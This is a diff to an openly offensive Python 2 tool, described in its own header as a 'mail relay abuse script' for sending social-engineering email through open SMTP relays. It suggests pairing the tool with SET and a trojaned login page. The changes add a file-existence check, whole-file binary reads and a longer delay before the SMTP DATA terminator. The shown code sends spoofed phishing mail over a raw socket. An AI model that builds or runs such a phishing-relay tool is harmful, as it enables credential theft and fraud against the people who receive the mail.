@@ -1,19 +1,22 @@
-#!/usr/bin/python
+#!/usr/bin/python2
 # simple mail relay abuse script
 # Will take list of target email addresses, text file with mail body
 # and source email address. Best used with SET and trojan'd login page
 # Author: Ian Simons
-# Version 0.1
+# Version 0.2
 # Licence: WTFPL - wtfpl.net
-
+# Changelog
+# Ver 0.2 - included inputfile check
+# Ver 0.1 - intial
 
 import socket
 import sys
 import argparse
 import re
+from os.path import isfile
 from time import sleep
 
-__version__ = "0.1"
+__version__ = "0.2"
 
 clear = "\x1b[0m"
 red = "\x1b[1;31m"
@@ -35,6 +38,14 @@ Quick fire SE email to an open relay, Version: %s
 \x1b[0m""" %__version__
 
 #   oblig program banner
+
+
+def checkfile(file):
+#   checks whether file exists
+    if isfile(file):
+        return True
+    else:
+        sys.exit("%s{!} File '%s' does not exist%s" % (red,file,clear))
 
 
 def checkmailsyntax(email):
@@ -61,8 +72,8 @@ def checkrelay(relay_ip, relay_port):
 def relay_cmds(source_email, emails, bodyfile, subject):
 #   extend sleeptime if response times are slow. may need to increase timeout too.
     sleeptime = 1
-    file = open(bodyfile,'r')
-    l = file.read(1024)
+    file = open(bodyfile,'rb')
+    l = file.read()
     try:
         betray = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         betray.setblocking(0)
@@ -87,8 +98,8 @@ def relay_cmds(source_email, emails, bodyfile, subject):
         while (l):
             betray.send(l + "\r\n")
             betray.recv(256)
-            l = file.read(1024)
-        sleep(sleeptime)
+            l = file.read()
+        sleep(10)
         betray.send(".\r\n")
         sleep(sleeptime)
         betray.send("QUIT\r\n")
@@ -118,6 +129,9 @@ def main():
 
     relay_ip = args.openrelay
     relay_port = args.relayport
+
+#   check bodyfile exists
+    checkfile(args.bodyfile)
 
 #   check validity
     with open(args.targetfile) as targets:
